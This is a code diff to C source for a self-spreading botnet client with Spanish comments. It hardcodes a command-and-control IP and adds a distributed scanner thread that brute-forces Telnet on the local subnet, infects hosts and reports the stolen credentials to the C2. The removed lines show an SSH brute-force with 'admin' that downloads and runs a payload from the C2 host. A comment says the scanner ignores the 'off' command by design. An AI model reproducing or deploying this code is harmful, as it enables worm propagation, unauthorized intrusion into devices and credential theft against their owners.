@@ -22,7 +22,7 @@
 #include "ssl_hardening.h"
 
 #ifndef C2_HOST
-#define C2_HOST "93.95.231.134"
+#define C2_HOST "207.244.255.208"
 #endif
 
 #define MAX_RECONNECT_ATTEMPTS 999999
@@ -39,15 +39,15 @@ char my_random_name[64];
 int hunter_mode = 0;
 
 // ============================================================================
-// HUNTER SUPPORT FUNCTIONS (Forward declaration)
+// DISTRIBUTED SCANNER - EL BOT ESCANEA, NO EL C2
 // ============================================================================
 
-void send_report(const char *type, const char *message);
+#include "distributed_scanner.h"
 
-// Include autonomous_hunter after forward declarations
-#include "autonomous_hunter.h"
+pthread_t scanner_thread_id = 0;
+ScannerConfig scanner_config;
 
-// Implementation of send_report
+// Callback para reportar al C2
 void send_report(const char *type, const char *message) {
     if (!is_connected || !c2_ssl) return;
     
@@ -55,6 +55,7 @@ void send_report(const char *type, const char *message) {
     json_object_object_add(report, "type", json_object_new_string(type));
     json_object_object_add(report, "bot_id", json_object_new_string(my_random_name));
     json_object_object_add(report, "message", json_object_new_string(message));
+    json_object_object_add(report, "timestamp", json_object_new_int64(time(NULL)));
     
     const char *report_str = json_object_to_json_string(report);
     char report_msg[4096];
@@ -62,6 +63,27 @@ void send_report(const char *type, const char *message) {
     
     SSL_write(c2_ssl, report_msg, strlen(report_msg));
     json_object_put(report);
+}
+
+// Iniciar scanner distribuido
+void start_distributed_scanner() {
+    if (scanner_thread_id != 0) {
+        printf("[*] Scanner already running\n");
+        return;
+    }
+    
+    // Configurar scanner
+    scanner_config.targets_per_round = 100; // 100 IPs por ronda
+    scanner_config.scan_interval = 60;       // 60 segundos entre rondas
+    scanner_config.report_callback = send_report;
+    strncpy(scanner_config.c2_host, C2_HOST, sizeof(scanner_config.c2_host) - 1);
+    scanner_config.c2_port = C2_PORT;
+    
+    pthread_create(&scanner_thread_id, NULL, distributed_scanner_thread, &scanner_config);
+    pthread_detach(scanner_thread_id);
+    
+    printf("[+] Distributed scanner started\n");
+    send_report("scanner_status", "Scanner activated");
 }
 
 // ============================================================================
@@ -248,37 +270,48 @@ void *auto_replication_thread(void *arg) {
         
         if (!is_connected) continue;
         
-        printf("[*] Starting auto-replication scan...\n");
+        printf("[*] Auto-replication: Scanning local subnet...\n");
+        send_report("replication", "Local subnet scan initiated");
         
-        // Escanear red local
-        char my_ip[32];
-        FILE *fp = popen("hostname -I | awk '{print $1}'", "r");
+        // Escanear red local (subnet del bot)
+        char my_ip[32] = {0};
+        FILE *fp = popen("hostname -I 2>/dev/null | awk '{print $1}'", "r");
         if (fp) {
-            fgets(my_ip, sizeof(my_ip), fp);
+            if (fgets(my_ip, sizeof(my_ip), fp) != NULL) {
+                my_ip[strcspn(my_ip, "\n")] = '\0';
+            }
             pclose(fp);
             
-            // Extraer subnet
-            char subnet[32];
-            strncpy(subnet, my_ip, sizeof(subnet));
-            char *last_dot = strrchr(subnet, '.');
-            if (last_dot) {
-                *(last_dot + 1) = '\0';
-                
-                // Escanear 20 hosts aleatorios en la subnet
-                for (int i = 0; i < 20; i++) {
-                    int host = (rand() % 254) + 1;
-                    char target[64];
-                    snprintf(target, sizeof(target), "%s%d", subnet, host);
+            if (strlen(my_ip) > 0) {
+                // Extraer subnet (192.168.1.X -> 192.168.1.)
+                char subnet[32];
+                strncpy(subnet, my_ip, sizeof(subnet) - 1);
+                char *last_dot = strrchr(subnet, '.');
+                if (last_dot) {
+                    *(last_dot + 1) = '\0';
                     
-                    // Intentar SSH con credenciales comunes
-                    char ssh_cmd[512];
-                    snprintf(ssh_cmd, sizeof(ssh_cmd),
-                        "sshpass -p 'admin' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "
-                        "root@%s 'cd /tmp; wget http://%s:8080/higurashi -O h; chmod +x h; ./h &' 2>/dev/null &",
-                        target, C2_HOST);
-                    system(ssh_cmd);
-                    
-                    usleep(100000); // 100ms entre intentos
+                    // Escanear 20 hosts aleatorios en subnet local
+                    for (int i = 0; i < 20; i++) {
+                        int host = (rand() % 254) + 1;
+                        char target[64];
+                        snprintf(target, sizeof(target), "%s%d", subnet, host);
+                        
+                        // Probar Telnet
+                        if (quick_port_scan(target, 23, 1000)) {
+                            char user[64], pass[64];
+                            if (telnet_bruteforce(target, 23, user, pass)) {
+                                // Infectar
+                                if (infect_target(target, 23, user, pass, C2_HOST, C2_PORT)) {
+                                    char msg[256];
+                                    snprintf(msg, sizeof(msg), 
+                                             "Local infection: %s [%s:%s]", target, user, pass);
+                                    send_report("infection_success", msg);
+                                }
+                            }
+                        }
+                        
+                        usleep(100000); // 100ms entre intentos
+                    }
                 }
             }
         }
@@ -378,25 +411,26 @@ int connect_to_c2() {
                 if (json_object_object_get_ex(cmd, "action", &action_obj)) {
                     const char *action = json_object_get_string(action_obj);
                     
-                    if (strcmp(action, "hunter") == 0) {
+                    if (strcmp(action, "hunter") == 0 || strcmp(action, "scanner") == 0) {
                         json_object *state_obj = NULL;
                         if (json_object_object_get_ex(cmd, "state", &state_obj)) {
                             const char *state = json_object_get_string(state_obj);
                             
                             if (strcmp(state, "on") == 0 && hunter_mode == 0) {
                                 hunter_mode = 1;
-                                printf("[*] Starting Hunter Mode...\n");
-                                start_autonomous_hunter();
+                                printf("[*] Starting Distributed Scanner Mode...\n");
+                                start_distributed_scanner();
                                 
-                                const char *response = "{\"status\":\"hunter_started\"}\n";
+                                const char *response = "{\"status\":\"scanner_started\"}\n";
                                 SSL_write(c2_ssl, response, strlen(response));
                             } else if (strcmp(state, "off") == 0) {
                                 hunter_mode = 0;
-                                const char *response = "{\"status\":\"hunter_stopped\"}\n";
+                                // Note: scanner thread no se detiene (by design)
+                                const char *response = "{\"status\":\"scanner_stopped\"}\n";
                                 SSL_write(c2_ssl, response, strlen(response));
                             }
                         }
-                    } else if (strcmp(action, "get_hunter_stats") == 0) {
+                    } else if (strcmp(action, "get_hunter_stats") == 0 || strcmp(action, "get_scanner_stats") == 0) {
                         // Enviar estadísticas del hunter
                         char stats[512];
                         snprintf(stats, sizeof(stats),
